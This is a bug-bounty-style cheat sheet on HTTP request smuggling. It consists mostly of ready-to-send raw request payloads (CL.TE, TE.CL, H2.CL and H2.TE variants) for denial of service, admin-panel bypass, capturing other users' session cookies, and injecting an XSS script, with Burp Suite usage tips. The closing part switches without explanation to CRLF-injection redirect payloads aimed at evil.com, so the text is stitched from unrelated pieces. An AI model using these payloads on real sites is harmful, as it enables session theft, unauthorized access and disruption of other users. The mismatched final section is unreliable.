# HTTP Request Smuggling

## Introduction
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

## Where to find
Request smuggling is primarily associated with HTTP/1 requests.
websites that support HTTP/2 may be vulnerable, depending on their back-end architecture (HTTP/1).

## Impact
bypass security controls
Gain unauthorized access to sensitive data
DoS aplication user with 404

## How to exploit
Note: BurpIntruder, set to send request every second, change version to HTTP/1, and uncheck "no header update"
Note: length is hughly important for this attack, calculate correctly
Note: BurpRepeater, set to change version to HTTP/1, and uncheck "no header update"

1. Basic payload
```
#DoS
POST / HTTP/1.1
Host: www.vuln.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
--------------------------

POST / HTTP/1.1
Host: www.vuln.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

--------------

#Bypass
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
----------------
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


#Post comment & Get Session
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test



###XSS
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1





POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net


#Response: (repeat each 5 sec until get bellow response)
302



--------------------------------------
###H2.CL
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1





#KETTLED (H2.TE)
REQUEST HEADER:
name: 
foo

Value:
bar\r\n
Transfer-Encoding: chunked


Body:
0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE;
Content-Length: 800

search=x

#Change CL value, until get Session
----------------------------------------------------
#KETTLED (H2.TE/Dual Path)
REQUEST HEADER:
name: 
foo

value:
bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net

#Repeat until get 302

---------------------------------------------------
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


--------------------------------------------------------
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0




Bug Bounty Report
https://hackerone.com/reports/726773
```
The response is
```
HTTP/1.1 200 OK
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Set-Cookie: language=en
Location: https://evil.com/
```

2. Double encode
```
https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
```

3. Bypass unicode
```
https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/
```

## References
* [@filedescriptor](https://blog.innerht.ml/twitter-crlf-injection/)
* [EdOverflow](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md)
